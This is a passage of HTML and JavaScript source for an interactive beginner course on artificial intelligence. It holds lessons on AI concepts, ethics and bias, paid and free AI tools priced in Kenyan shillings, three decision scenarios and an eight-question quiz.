1: How AI Works</div>\n    <div class="module-tab locked" data-mod="2">Week 1: Applications</div>\n    <div class="module-tab locked" data-mod="3">Decision Lab</div>\n    <div class="module-tab locked" data-mod="4">Week 2: AI Tools</div>\n    <div class="module-tab locked" data-mod="5">Week 2: Evaluation</div>\n    <div class="module-tab locked" data-mod="6">Quiz Time</div>\n  </div>\n  <div class="lesson-wrap" id="lessonContent"></div>\n</div>\n\n<!-- SUMMARY -->\n<div class="screen" id="summary">\n  <div class="summary-content">\n    <span class="trophy">&#127942;</span>\n    <h2 class="summary-title">Weeks 1 &amp; 2 <span>Complete!</span></h2>\n    <p class="summary-sub">You have mastered AI fundamentals and practical AI tools. Here is your achievement snapshot:</p>\n    <div class="score-row">\n      <div class="score-chip"><div class="num" id="scorePct">--</div><div class="lbl">QUIZ SCORE</div></div>\n      <div class="score-chip"><div class="num">14</div><div class="lbl">LESSONS DONE</div></div>\n      <div class="score-chip"><div class="num">3</div><div class="lbl">DECISIONS MADE</div></div>\n    </div>\n    <div class="topic-pills">\n      <div class="topic-pill">&#9989; What is AI</div>\n      <div class="topic-pill">&#9989; AI Stages</div>\n      <div class="topic-pill">&#9989; Machine Learning</div>\n      <div class="topic-pill">&#9989; Neural Networks</div>\n      <div class="topic-pill">&#9989; AI Applications</div>\n      <div class="topic-pill">&#9989; AI Ethics &amp; Bias</div>\n      <div class="topic-pill">&#9989; Paid AI Tools</div>\n      <div class="topic-pill">&#9989; Free AI Tools</div>\n      <div class="topic-pill">&#9989; AI Evaluation</div>\n      <div class="topic-pill">&#9989; Decision Framework</div>\n    </div>\n    <button class="btn btn-blue" onclick="restartLesson()" style="margin-right:12px">&#8635; Restart Course</button>\n    <button class="btn btn-outline" onclick="goSplash()">&#8592; Home</button>\n  </div>\n</div>\n\n<!-- NARRATOR BAR -->\n<div id="narrator-bar" class="hidden">\n  <div class="narrator-icon" id="narratorPlayBtn" onclick="narratorToggle()" title="Play / Pause">&#9654;</div>\n  <div class="narrator-label">\n    <div class="narrator-status" id="narratorStatus">Ready</div>\n    <div class="narrator-title" id="narratorTitle">Click play to begin</div>\n  </div>\n  <div class="narrator-wave" id="narratorWave">\n    <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>\n  </div>\n  <div class="narrator-speed" id="narratorSpeedBtn" onclick="cycleSpeed()" title="Speed">1x</div>\n  <div class="narrator-btn" onclick="narratorStop()" title="Stop">&#9632;</div>\n  <div class="narrator-btn" onclick="hideNarrator()" title="Close">&#10005;</div>\n</div>\n<div id="narrator-toggle" onclick="showNarrator()" title="Narrator">&#127908;</div>\n\n<script>\n// ═══════════════════ DATA ═══════════════════\nvar steps = [\n\n  // STEP 0: What is AI\n  {\n    mod: 0, type: ''content'',\n    tag: ''WEEK 1 · MODULE 1.1'',\n    title: ''What Is Artificial Intelligence?'',\n    html: ''<div class="content-block"><p class="block-text"><strong>Artificial Intelligence (AI)</strong> refers to computer systems designed to perform tasks that typically require <span class="term">human intelligence</span>. These tasks include learning, reasoning, problem-solving, perceiving the world, understanding language, and making decisions.</p><br><p class="block-text">Key characteristics of AI:</p><br><p class="block-text"><span class="info-pill">&#129504; Learning from experience</span><span class="info-pill">&#127919; Adapting to new inputs</span><span class="info-pill">&#9889; Processing data fast</span><span class="info-pill">&#128202; Pattern recognition</span><span class="info-pill">&#129302; Human-like tasks</span></p></div><div class="content-block"><h3 class="block-title">The 3 Stages of AI Development</h3><div class="cards-grid"><div class="concept-card" style="border-left-color:var(--emerald)"><div class="icon">&#127919;</div><h4 style="color:var(--emerald)">Narrow AI (NOW)</h4><p>Designed for specific tasks only. Examples: Siri, Netflix recommendations. Cannot transfer knowledge between domains.</p></div><div class="concept-card" style="border-left-color:var(--amber)"><div class="icon">&#129504;</div><h4 style="color:var(--amber)">General AI (FUTURE)</h4><p>Would match human intelligence across ALL domains. Can transfer skills between areas. Does not yet exist.</p></div><div class="concept-card" style="border-left-color:var(--rose)"><div class="icon">&#127756;</div><h4 style="color:var(--rose)">Super AI (THEORETICAL)</h4><p>Would surpass human intelligence in every way. Hypothetical concept. Raises major ethical concerns.</p></div></div></div><div class="content-block"><h3 class="block-title">AI Can and Cannot</h3><div class="compare-cols"><div class="compare-col good"><div class="compare-col-title">&#10003; AI Today CAN</div><div class="compare-item"><span class="tick">&#10003;</span> Understand and generate human language</div><div class="compare-item"><span class="tick">&#10003;</span> Recognize faces and objects in images</div><div class="compare-item"><span class="tick">&#10003;</span> Diagnose diseases from medical images</div><div class="compare-item"><span class="tick">&#10003;</span> Translate languages in real-time</div><div class="compare-item"><span class="tick">&#10003;</span> Play complex games at superhuman levels</div></div><div class="compare-col bad"><div class="compare-col-title">&#10007; AI Today CANNOT</div><div class="compare-item"><span class="cross">&#10007;</span> Experience emotions or consciousness</div><div class="compare-item"><span class="cross">&#10007;</span> Understand context like humans</div><div class="compare-item"><span class="cross">&#10007;</span> Apply common sense consistently</div><div class="compare-item"><span class="cross">&#10007;</span> Be truly creative without training data</div><div class="compare-item"><span class="cross">&#10007;</span> Explain all its own decisions</div></div></div></div>''\n  },\n\n  // STEP 1: How AI Works\n  {\n    mod: 1, type: ''content'',\n    tag: ''WEEK 1 · MODULE 2'',\n    title: ''How Does AI Work?'',\n    html: ''<div class="content-block"><h3 class="block-title">The AI Processing Pipeline</h3><p class="block-text" style="margin-bottom:18px">AI does not follow fixed rules like a recipe. Instead it <span class="term">learns patterns from data</span>. Here is how information flows through an AI system:</p><div class="timeline-item"><div class="timeline-num">1</div><div class="timeline-content"><h4>&#128190; Data Input</h4><p>AI receives raw data: text, images, numbers, audio</p></div></div><div class="timeline-item"><div class="timeline-num">2</div><div class="timeline-content"><h4>&#129529; Data Processing</h4><p>AI cleans and prepares the data for analysis</p></div></div><div class="timeline-item"><div class="timeline-num">3</div><div class="timeline-content"><h4>&#128269; Feature Extraction</h4><p>AI identifies important characteristics and patterns</p></div></div><div class="timeline-item"><div class="timeline-num">4</div><div class="timeline-content"><h4>&#129504; Pattern Recognition</h4><p>AI finds patterns connecting features to outcomes</p></div></div><div class="timeline-item"><div class="timeline-num">5</div><div class="timeline-content"><h4>&#127919; Decision / Prediction</h4><p>AI produces a result: a classification, prediction, or generated output</p></div></div></div><div class="content-block"><h3 class="block-title">Three Types of Machine Learning</h3><div class="cards-grid"><div class="concept-card"><div class="icon">&#127979;</div><h4>Supervised Learning</h4><p>Learns from labeled examples (like a teacher giving correct answers). Used for spam filters, image classifiers.</p></div><div class="concept-card"><div class="icon">&#128270;</div><h4>Unsupervised Learning</h4><p>Finds hidden patterns in unlabeled data. Used for customer segmentation, anomaly detection.</p></div><div class="concept-card"><div class="icon">&#127881;</div><h4>Reinforcement Learning</h4><p>Learns through trial and error with rewards. Like training a dog with treats. Used in game AI, robotics.</p></div></div></div><div class="content-block"><h3 class="block-title">Neural Networks &amp; Deep Learning</h3><p class="block-text">Neural networks are AI systems inspired by the <span class="term">human brain</span>. They have three types of layers:</p><br><table class="data-table"><tr><th>Layer</th><th>Role</th><th>Example</th></tr><tr><td>Input Layer</td><td>Receives raw data</td><td>Pixels of an image</td></tr><tr><td>Hidden Layers</td><td>Transform and learn patterns</td><td>Detect edges, shapes, parts</td></tr><tr><td>Output Layer</td><td>Produces the final result</td><td>"This is a cat"</td></tr></table><br><p class="block-text"><strong>Deep Learning</strong> uses neural networks with many hidden layers. More layers = ability to learn more complex patterns. Powers most modern AI breakthroughs including ChatGPT and image generators.</p></div>''\n  },\n\n  // STEP 2: AI Applications\n  {\n    mod: 2, type: ''content'',\n    tag: ''WEEK 1 · MODULE 3'',\n    title: ''Real-World AI Applications'',\n    html: ''<div class="content-block"><h3 class="block-title">Natural Language Processing (NLP)</h3><p class="block-text" style="margin-bottom:16px">NLP enables computers to understand, interpret, and generate human language. It powers most AI tools you interact with daily.</p><div class="cards-grid"><div class="concept-card"><div class="icon">&#129302;</div><h4>Chatbots</h4><p>Siri, Alexa, customer service bots. 24/7 automated responses.</p></div><div class="concept-card"><div class="icon">&#127760;</div><h4>Translation</h4><p>Google Translate, DeepL. Real-time language conversion with context.</p></div><div class="concept-card"><div class="icon">&#128172;</div><h4>Sentiment Analysis</h4><p>Analyzing customer reviews and social media for brand perception.</p></div><div class="concept-card"><div class="icon">&#9999;&#65039;</div><h4>Content Generation</h4><p>AI writing assistants, automated reports, code generation.</p></div></div></div><div class="content-block"><h3 class="block-title">AI Across Industries</h3><table class="data-table"><tr><th>Industry</th><th>AI Application</th><th>Example</th></tr><tr><td>Healthcare</td><td>Medical image analysis</td><td>Detecting tumors in X-rays and MRI scans</td></tr><tr><td>Finance</td><td>Fraud detection</td><td>Banks flagging unusual card transactions</td></tr><tr><td>Retail</td><td>Recommendation engines</td><td>Amazon: "Customers who bought this also bought..."</td></tr><tr><td>Agriculture</td><td>Crop monitoring</td><td>Drones identifying plant diseases</td></tr><tr><td>Transport</td><td>Autonomous vehicles</td><td>Self-driving cars recognizing pedestrians</td></tr><tr><td>HR</td><td>Resume screening</td><td>AI shortlisting candidates from thousands of CVs</td></tr></table></div><div class="content-block"><h3 class="block-title">Recommendation Engines — How They Work</h3><div class="timeline-item"><div class="timeline-num">1</div><div class="timeline-content"><h4>Collect User Data</h4><p>Track clicks, views, purchases, and time spent</p></div></div><div class="timeline-item"><div class="timeline-num">2</div><div class="timeline-content"><h4>Identify Patterns</h4><p>Find what types of content or products the user prefers</p></div></div><div class="timeline-item"><div class="timeline-num">3</div><div class="timeline-content"><h4>Find Similar Users</h4><p>Compare behaviour with users who have similar tastes</p></div></div><div class="timeline-item"><div class="timeline-num">4</div><div class="timeline-content"><h4>Predict and Present</h4><p>Show the user items they are most likely to engage with</p></div></div><br><p class="block-text" style="margin-top:8px">Used by: Netflix, YouTube, Spotify, Amazon, LinkedIn, news apps</p></div>''\n  },\n\n  // STEP 3: Ethics & Challenges\n  {\n    mod: 2, type: ''content'',\n    tag: ''WEEK 1 · MODULE 4'',\n    title: ''AI Challenges, Ethics & Social Impact'',\n    html: ''<div class="content-block"><h3 class="block-title">AI Bias — A Critical Problem</h3><p class="block-text" style="margin-bottom:16px"><span class="term">AI bias</span> occurs when AI systems reflect and amplify prejudices present in training data. Biased AI can cause real harm:</p><div class="cards-grid"><div class="concept-card" style="border-left-color:var(--rose)"><div class="icon">&#128085;</div><h4 style="color:var(--rose)">Historical Bias</h4><p>AI trained on past data reflects past discrimination. E.g., hiring AI that favors male candidates.</p></div><div class="concept-card" style="border-left-color:var(--rose)"><div class="icon">&#128202;</div><h4 style="color:var(--rose)">Sampling Bias</h4><p>Training data does not represent all groups. E.g., facial recognition performing worse on dark skin.</p></div><div class="concept-card" style="border-left-color:var(--rose)"><div class="icon">&#128336;</div><h4 style="color:var(--rose)">Measurement Bias</h4><p>How data is collected influences results. E.g., crime prediction tools with racially biased data.</p></div></div></div><div class="content-block"><h3 class="block-title">Ethical Principles for AI</h3><table class="data-table"><tr><th>Principle</th><th>What It Means</th></tr><tr><td><strong style="color:var(--cyan)">Transparency</strong></td><td>Users should know when they are interacting with AI</td></tr><tr><td><strong style="color:var(--cyan)">Fairness</strong></td><td>AI should treat all individuals and groups equitably</td></tr><tr><td><strong style="color:var(--cyan)">Privacy</strong></td><td>Personal data should be protected and used responsibly</td></tr><tr><td><strong style="color:var(--cyan)">Accountability</strong></td><td>Clear responsibility for AI decisions and outcomes</td></tr><tr><td><strong style="color:var(--cyan)">Safety</strong></td><td>AI should not cause harm to users or society</td></tr><tr><td><strong style="color:var(--cyan)">Human Oversight</strong></td><td>Humans must maintain meaningful control over critical decisions</td></tr></table></div><div class="content-block"><h3 class="block-title">Social Impact: Employment</h3><div class="compare-cols"><div class="compare-col bad"><div class="compare-col-title">Jobs Most at Risk</div><div class="compare-item"><span class="cross">&#9888;</span> Data entry and processing</div><div class="compare-item"><span class="cross">&#9888;</span> Routine customer service</div><div class="compare-item"><span class="cross">&#9888;</span> Basic bookkeeping</div><div class="compare-item"><span class="cross">&#9888;</span> Simple manufacturing tasks</div></div><div class="compare-col good"><div class="compare-col-title">Jobs Least at Risk</div><div class="compare-item"><span class="tick">&#10003;</span> Complex human interaction roles</div><div class="compare-item"><span class="tick">&#10003;</span> Creative and strategic positions</div><div class="compare-item"><span class="tick">&#10003;</span> Roles requiring emotional intelligence</div><div class="compare-item"><span class="tick">&#10003;</span> Jobs needing ethical judgment</div></div></div></div>''\n  },\n\n  // STEP 4: DECISION 1\n  {\n    mod: 3, type: ''decision'',\n    scenario: {\n      label: ''DECISION LAB · SCENARIO 1'',\n      title: ''Nairobi Hospital Diagnostic System'',\n      text: ''Kenyatta National Hospital wants to implement AI to help doctors. They are deciding between: using AI to fully replace radiologists in reading X-rays, or using AI as a support tool that flags potential issues for radiologists to review. What approach should they take?''\n    },\n    choices: [\n      { letter: ''A'', text: ''Full AI replacement — let AI make all diagnostic decisions autonomously to cut costs'', correct: false },\n      { letter: ''B'', text: ''AI as a support tool — AI flags potential issues, but doctors make final decisions'', correct: true },\n      { letter: ''C'', text: ''Reject AI entirely — medical decisions should never involve computers'', correct: false },\n      { letter: ''D'', text: ''Use AI only for billing and administration, not diagnostics'', correct: false }\n    ],\n    feedback: {\n      correct: { icon: ''&#127919;'', title: ''Excellent strategic thinking!'', text: ''<strong>AI as a support tool</strong> is the correct approach. This maintains <strong>human oversight</strong>, one of the core ethical principles of AI adoption. AI can analyse thousands of X-rays and flag anomalies with high accuracy, but human doctors bring clinical judgment, context, and accountability. This hybrid approach leverages AI speed while keeping humans responsible for life-critical decisions.'' },\n      wrong: { icon: ''&#128161;'', title: ''Good thinking, but not quite!'', text: ''The correct answer is <strong>B — AI as a support tool</strong>. Full replacement removes essential human oversight and accountability. Rejecting AI misses enormous benefits for early disease detection. The best approach uses AI to augment human capability, not replace human judgment in high-stakes decisions.'' }\n    }\n  },\n\n  // STEP 5: Understanding AI Tools\n  {\n    mod: 4, type: ''content'',\n    tag: ''WEEK 2 · MODULE 5'',\n    title: ''Understanding AI Tools'',\n    html: ''<div class="content-block"><p class="block-text"><strong>AI tools</strong> are software applications that leverage AI technologies to perform tasks that traditionally required human intelligence. They range from simple single-function apps to complex enterprise platforms.</p><br><p class="block-text"><span class="info-pill">&#129500; Content Creation</span><span class="info-pill">&#127912; Design &amp; Visual</span><span class="info-pill">&#128736; Productivity</span><span class="info-pill">&#128187; Coding</span><span class="info-pill">&#128200; Marketing</span><span class="info-pill">&#128202; Data Analysis</span><span class="info-pill">&#129483; Customer Service</span><span class="info-pill">&#127908; Audio &amp; Voice</span></p></div><div class="content-block"><h3 class="block-title">Paid vs Free AI Tools — Key Differences</h3><div class="compare-cols"><div class="compare-col good"><div class="compare-col-title">&#128181; Paid AI Tools</div><div class="compare-item"><span class="tick">&#10003;</span> Latest, most advanced AI models</div><div class="compare-item"><span class="tick">&#10003;</span> Unlimited or very high usage quotas</div><div class="compare-item"><span class="tick">&#10003;</span> Commercial use rights — legally safe</div><div class="compare-item"><span class="tick">&#10003;</span> Priority customer support 24/7</div><div class="compare-item"><span class="tick">&#10003;</span> Privacy: data not used for training</div><div class="compare-item"><span class="tick">&#10003;</span> Team collaboration and integrations</div></div><div class="compare-col bad"><div class="compare-col-title">&#128274; Free AI Tools</div><div class="compare-item"><span class="cross">&#10007;</span> Older or less powerful AI models</div><div class="compare-item"><span class="cross">&#10007;</span> Daily/monthly usage caps</div><div class="compare-item"><span class="cross">&#10007;</span> Commercial use often restricted</div><div class="compare-item"><span class="cross">&#10007;</span> Community forums only for support</div><div class="compare-item"><span class="cross">&#10007;</span> May include ads and upsell prompts</div><div class="compare-item"><span class="tick">&#10003;</span> Great for learning and experimentation</div></div></div></div><div class="content-block"><h3 class="block-title">Key AI Tools to Know</h3><div class="tool-card"><div class="tool-header"><span class="tool-name">Jasper AI</span><span class="tool-cost">KES 5,000–13,000/mo</span></div><div class="tool-desc">Best for marketing teams and businesses. Features brand voice training, 50+ templates, SEO integration, multilingual support. Ideal for blog posts, ad copy, email campaigns.</div><div class="tool-tags"><span class="tool-tag">Content Writing</span><span class="tool-tag">Marketing</span><span class="tool-tag">SEO</span></div></div><div class="tool-card"><div class="tool-header"><span class="tool-name">ChatGPT Plus</span><span class="tool-cost">KES 2,000/mo</span></div><div class="tool-desc">GPT-4 powered general AI. Versatile for writing, coding, analysis, tutoring. Access to plugins and web browsing. Best all-around AI assistant.</div><div class="tool-tags"><span class="tool-tag">General AI</span><span class="tool-tag">Writing</span><span class="tool-tag">Coding</span></div></div><div class="tool-card"><div class="tool-header"><span class="tool-name">ChatGPT Free</span><span class="tool-cost free">FREE</span></div><div class="tool-desc">GPT-3.5 model. Good for learning and personal projects. Slower during peak hours, no plugins, limited memory, cannot browse internet. Best starting point for AI learners.</div><div class="tool-tags"><span class="tool-tag">Free</span><span class="tool-tag">Learning</span><span class="tool-tag">Writing</span></div></div><div class="tool-card"><div class="tool-header"><span class="tool-name">GitHub Copilot</span><span class="tool-cost">KES 1,000–2,000/mo</span></div><div class="tool-desc">AI code completion for developers. Auto-completes functions, detects bugs, generates documentation, translates code between languages.</div><div class="tool-tags"><span class="tool-tag">Coding</span><span class="tool-tag">Developers</span></div></div></div>''\n  },\n\n  // STEP 6: More AI Tools\n  {\n    mod: 4, type: ''content'',\n    tag: ''WEEK 2 · MODULE 6 & 7'',\n    title: ''AI Tools Across Every Field'',\n    html: ''<div class="content-block"><h3 class="block-title">Design &amp; Visual AI</h3><div class="tool-card"><div class="tool-header"><span class="tool-name">Midjourney</span><span class="tool-cost">KES 1,000–12,000/mo</span></div><div class="tool-desc">Produces stunning professional artwork from text prompts. Used by designers, marketers, and creative agencies worldwide.</div><div class="tool-tags"><span class="tool-tag">Image Generation</span><span class="tool-tag">Professional Art</span></div></div><div class="tool-card"><div class="tool-header"><span class="tool-name">Canva AI</span><span class="tool-cost free">Free + Paid</span></div><div class="tool-desc">Easy drag-and-drop design with AI features. AI image generation, background removal, text-to-design. Perfect for social media graphics.</div><div class="tool-tags"><span class="tool-tag">Graphic Design</span><span class="tool-tag">Social Media</span><span class="tool-tag">Free Tier</span></div></div><div class="tool-card"><div class="tool-header"><span class="tool-name">Synthesia</span><span class="tool-cost">KES 3,000+/mo</span></div><div class="tool-desc">Creates professional AI avatar videos without filming. Type a script and an AI presenter delivers it. Used for training videos, e-learning, and presentations.</div><div class="tool-tags"><span class="tool-tag">Video AI</span><span class="tool-tag">E-Learning</span><span class="tool-tag">Avatars</span></div></div></div><div class="content-block"><h3 class="block-title">Business, Marketing &amp; Productivity AI</h3><div class="tool-card"><div class="tool-header"><span class="tool-name">Surfer SEO</span><span class="tool-cost">KES 7,000–25,000/mo</span></div><div class="tool-desc">Real-time SEO scoring and keyword optimization. Shows exactly how to structure content to rank on Google. Integrates with Jasper AI.</div><div class="tool-tags"><span class="tool-tag">SEO</span><span class="tool-tag">Marketing</span></div></div><div class="tool-card"><div class="tool-header"><span class="tool-name">Notion AI</span><span class="tool-cost">KES 1,000/user/mo</span></div><div class="tool-desc">AI-powered knowledge management and note-taking. Summarize documents, generate meeting notes, create content within your workspace.</div><div class="tool-tags"><span class="tool-tag">Productivity</span><span class="tool-tag">Knowledge Management</span></div></div><div class="tool-card"><div class="tool-header"><span class="tool-name">ElevenLabs</span><span class="tool-cost free">Free + Paid</span></div><div class="tool-desc">Highly realistic AI voice generation and voice cloning. Used for podcasts, audiobooks, e-learning narration, and content accessibility.</div><div class="tool-tags"><span class="tool-tag">Voice AI</span><span class="tool-tag">Audio</span></div></div></div><div class="content-block"><h3 class="block-title">ROI Calculator — Is Paid AI Worth It?</h3><p class="block-text" style="margin-bottom:16px">Use this formula to decide if a paid AI tool makes financial sense:</p><table class="data-table"><tr><th>Component</th><th>Formula</th></tr><tr><td>Time Value</td><td>Hours saved per month × Your hourly rate</td></tr><tr><td>Total Benefit</td><td>Time Value + Quality improvement + Competitive advantage</td></tr><tr><td>ROI</td><td>(Total Benefit - Tool Cost) / Tool Cost × 100 = %</td></tr></table><br><p class="block-text"><strong style="color:var(--emerald)">ROI &gt; 200%</strong> = Highly justified. <strong style="color:var(--blue-light)">ROI &gt; 100%</strong> = Beneficial. <strong style="color:var(--amber)">ROI 50-100%</strong> = Marginal. <strong style="color:var(--rose)">ROI &lt; 50%</strong> = Explore free alternatives.</p></div>''\n  },\n\n  // STEP 7: DECISION 2\n  {\n    mod: 3, type: ''decision'',\n    scenario: {\n      label: ''DECISION LAB · SCENARIO 2'',\n      title: ''M.T.T.I Student Project Dilemma'',\n      text: ''A student at M.T.T.I needs to create a business proposal with graphics, a short presentation video, and written content. She has a very limited budget (almost zero). Which combination of free AI tools should she use?''\n    },\n    choices: [\n      { letter: ''A'', text: ''Buy Jasper AI + Midjourney + Synthesia subscriptions for the best quality output'', correct: false },\n      { letter: ''B'', text: ''Use ChatGPT Free for writing, Canva free tier for graphics, and a free Leonardo.ai account for images'', correct: true },\n      { letter: ''C'', text: ''Use only ChatGPT Free for absolutely everything including graphics and video'', correct: false },\n      { letter: ''D'', text: ''Do the project manually — AI tools are not suitable for student work'', correct: false }\n    ],\n    feedback: {\n      correct: { icon: ''&#127881;'', title: ''Smart strategic thinking!'', text: ''<strong>Option B is the hybrid approach</strong> done right. ChatGPT Free handles writing and brainstorming well. Canva free tier provides professional-looking graphic design with no cost. Leonardo.ai has a generous free tier for image generation. This covers all her needs with zero budget — exactly what the decision-making framework recommends for personal/student projects.'' },\n      wrong: { icon: ''&#128161;'', title: ''Think about the context!'', text: ''The correct answer is <strong>B</strong>. Paid tools are overkill for a student project and unnecessary cost. ChatGPT alone cannot create graphics or video. Avoiding AI entirely misses valuable tools available at no cost. The framework says: use free tools for learning, personal projects, and low-stakes tasks.'' }\n    }\n  },\n\n  // STEP 8: How to Evaluate AI\n  {\n    mod: 5, type: ''content'',\n    tag: ''WEEK 2 · MODULE 9 & 10'',\n    title: ''Evaluating AI Quality & Making Smart Decisions'',\n    html: ''<div class="content-block"><h3 class="block-title">The 5-Question Test</h3><p class="block-text" style="margin-bottom:18px">Use these 5 tests to quickly evaluate the quality of any AI tool before using it professionally:</p><div class="timeline-item"><div class="timeline-num">1</div><div class="timeline-content"><h4>&#128200; Factual Accuracy Test</h4><p>Ask about a verifiable fact. Good AI: gives correct answer or admits uncertainty. Poor AI: confidently gives wrong information.</p></div></div><div class="timeline-item"><div class="timeline-num">2</div><div class="timeline-content"><h4>&#129518; Reasoning Test</h4><p>Ask a calculation question. Good AI: shows working and gives correct answer. Poor AI: skips steps or gives wrong result.</p></div></div><div class="timeline-item"><div class="timeline-num">3</div><div class="timeline-content"><h4>&#127775; Creativity Test</h4><p>Ask for original ideas. Good AI: gives diverse, relevant, original ideas. Poor AI: gives clichéd, generic, repetitive responses.</p></div></div><div class="timeline-item"><div class="timeline-num">4</div><div class="timeline-content"><h4>&#129504; Context Test</h4><p>Start a topic, then ask a follow-up. Good AI: remembers context. Poor AI: treats follow-up as a brand new question.</p></div></div><div class="timeline-item"><div class="timeline-num">5</div><div class="timeline-content"><h4>&#128683; Limitation Test</h4><p>Ask something it cannot know. Good AI: admits it cannot know this. Poor AI: makes up a convincing-sounding answer.</p></div></div></div><div class="content-block"><h3 class="block-title">Red Flags — Avoid These AI Tools</h3><div class="compare-cols"><div class="compare-col bad"><div class="compare-col-title">&#128308; Immediate Red Flags</div><div class="compare-item"><span class="cross">&#10007;</span> Fabricates citations or fake sources</div><div class="compare-item"><span class="cross">&#10007;</span> Confidently states verifiably false facts</div><div class="compare-item"><span class="cross">&#10007;</span> Cannot follow simple instructions</div><div class="compare-item"><span class="cross">&#10007;</span> Generates harmful or biased content</div><div class="compare-item"><span class="cross">&#10007;</span> Frequently crashes or times out</div></div><div class="compare-col" style="border-top-color:var(--amber)"><div class="compare-col-title" style="color:var(--amber)">&#9888; Warning Signs</div><div class="compare-item"><span style="color:var(--amber)">!</span> Overly generic, one-size-fits-all responses</div><div class="compare-item"><span style="color:var(--amber)">!</span> Repetitive phrasing across different prompts</div><div class="compare-item"><span style="color:var(--amber)">!</span> Cannot handle nuance or edge cases</div><div class="compare-item"><span style="color:var(--amber)">!</span> Inconsistent quality between sessions</div></div></div></div><div class="content-block"><h3 class="block-title">5-Step Selection Framework</h3><div class="timeline-item"><div class="timeline-num">1</div><div class="timeline-content"><h4>Define Your Needs</h4><p>What specific tasks? How often? What quality required? What is your budget?</p></div></div><div class="timeline-item"><div class="timeline-num">2</div><div class="timeline-content"><h4>Research Options</h4><p>Read reviews on G2 and Capterra. Watch YouTube demos. Join AI communities for real user opinions.</p></div></div><div class="timeline-item"><div class="timeline-num">3</div><div class="timeline-content"><h4>Test Before Committing</h4><p>Always use the free trial or free tier first. Test with YOUR real tasks, not toy examples.</p></div></div><div class="timeline-item"><div class="timeline-num">4</div><div class="timeline-content"><h4>Evaluate Results</h4><p>Document strengths and weaknesses. Calculate actual ROI. Get team feedback if applicable.</p></div></div><div class="timeline-item"><div class="timeline-num">5</div><div class="timeline-content"><h4>Make an Informed Decision</h4><p>Choose based on data, not hype. Start monthly before committing annually. Always have a backup option.</p></div></div></div>''\n  },\n\n  // STEP 9: DECISION 3\n  {\n    mod: 3, type: ''decision'',\n    scenario: {\n      label: ''DECISION LAB · SCENARIO 3'',\n      title: ''Tech Startup — AI Tool Investment'',\n      text: ''Wanjiru runs a growing Nairobi digital marketing agency with 5 staff. She wants to use AI to write client blog posts (published commercially), design social media graphics, and optimize client websites for Google. She has a monthly budget of KES 15,000 for AI tools. What is her best strategy?''\n    },\n    choices: [\n      { letter: ''A'', text: ''Use only free tools to save all the budget — ChatGPT Free and Canva Free for everything'', correct: false },\n      { letter: ''B'', text: ''Buy the most expensive tools available — quality equals price'', correct: false },\n      { letter: ''C'', text: ''Use Jasper AI for content (paid), Canva Pro for design (mid-range), and Surfer SEO for optimization — hybrid paid approach tailored to professional commercial needs'', correct: true },\n      { letter: ''D'', text: ''Hire more human writers and designers instead of using AI'', correct: false }\n    ],\n    feedback: {\n      correct: { icon: ''&#128176;'', title: ''Perfect business thinking!'', text: ''This is the <strong>ideal hybrid paid strategy</strong> for a commercial agency. Jasper AI produces commercially licensed content at scale. Canva Pro gives the team professional design tools with brand kit features. Surfer SEO directly improves client rankings. Each tool addresses a specific business need. Free tools would have commercial restrictions and quality limitations that could expose Wanjiru to legal risk and client dissatisfaction.'' },\n      wrong: { icon: ''&#128161;'', title: ''Think about her specific business context!'', text: ''The correct answer is <strong>C</strong>. Free tools have commercial use restrictions — risky for client work. Buying the most expensive tools wastes budget. Hiring humans without AI is less competitive. For a commercial agency, paid tools with the right features for each specific job is the smart investment — the ROI calculation would show clear positive returns.'' }\n    }\n  },\n\n  // STEP 10: Quiz\n  {\n    mod: 6, type: ''quiz'',\n    title: ''Knowledge Check — Weeks 1 & 2'',\n    subtitle: ''Test your understanding of AI fundamentals and AI tools'',\n    questions: [\n      {\n        q: ''Which stage of AI development do we currently have in 2025?'',\n        options: [''Super AI — surpasses human intelligence'', ''General AI — matches humans in all areas'', ''Narrow AI — designed for specific tasks only'', ''Quantum AI — uses quantum computing''],\n        correct: 2\n      },\n      {\n        q: ''What type of Machine Learning learns from labeled training data?'',\n        options: [''Unsupervised Learning'', ''Reinforcement Learning'', ''Deep Learning'', ''Supervised Learning''],\n        correct: 3\n      },\n      {\n        q: ''Which AI tool is best suited for generating professional marketing copy at a commercial agency?'',\n        options: [''ChatGPT Free'', ''Jasper AI (Paid)'', ''Google Translate'', ''GitHub Copilot''],\n        correct: 1\n      },\n      {\n        q: ''What is a major red flag when evaluating an AI tool?'',\n        options: [''It has a free trial period'', ''It requires an internet connection'', ''It confidently fabricates false information'', ''It has video tutorials''],\n        correct: 2\n      },\n      {\n        q: ''AI bias is primarily caused by:'',\n        options: [''Slow internet connections'', ''Biased or unrepresentative training data'', ''Expensive hardware'', ''Using too many AI tools at once''],\n        correct: 1\n      },\n      {\n        q: ''Which tool creates AI avatar videos without any filming?'',\n        options: [''Canva AI'', ''Jasper AI'', ''Synthesia'', ''Surfer SEO''],\n        correct: 2\n      },\n      {\n        q: ''According to the decision framework, when should you use FREE AI tools?'',\n        options: [''Always — paid tools are never worth it'', ''For commercial client deliverables'', ''For learning, personal projects, and experimentation'', ''Only for coding tasks''],\n        correct: 2\n      },\n      {\n        q: ''In the 5-Question Test, the Limitation Test checks whether the AI:'',\n        options: [''Can answer questions about its price'', ''Admits what it does not know rather than making up answers'', ''Has a good user interface'', ''Supports Swahili language''],\n        correct: 1\n      }\n    ]\n  },\n\n  // STEP 11: Review\n  {\n    mod: 6, type: ''content'',\n    tag: ''WEEKS 1 & 2 · COMPLETE'',\n    title: ''Key Takeaways & What Comes Next'',\n    html: ''<div class="content-block" style="background:linear-gradient(135deg,#1e3a5f,#0f2040);border-color:rgba(59,130,246,.3)"><h3 class="block-title">What You Have Learned</h3><div style="display:flex;flex-direction:column;gap:10px;margin-top:4px">'' +\n      [[''&#129504;'',''What is AI'',''Computer systems that perform tasks requiring human intelligence — currently at the Narrow AI stage''],\n       [''&#129302;'',''How AI Works'',''Through data pipelines, machine learning (supervised, unsupervised, reinforcement), and neural networks''],\n       [''&#127760;'',''AI Applications'',''NLP, computer vision, recommendation engines, fraud detection, healthcare diagnostics, and more''],\n       [''&#9878;'',''Ethics & Bias'',''AI bias from training data, ethical principles: transparency, fairness, privacy, accountability, safety''],\n       [''&#128736;'',''AI Tools'',''Range from free (ChatGPT Free, Canva) to paid (Jasper, Midjourney, Synthesia, Surfer SEO, GitHub Copilot)''],\n       [''&#128200;'',''ROI Evaluation'',''Calculate time saved × hourly rate versus tool cost. ROI over 200% = highly justified''],\n       [''&#127919;'',''Decision Framework'',''5-step process: Define needs, Research, Test free first, Evaluate, then Decide based on data not 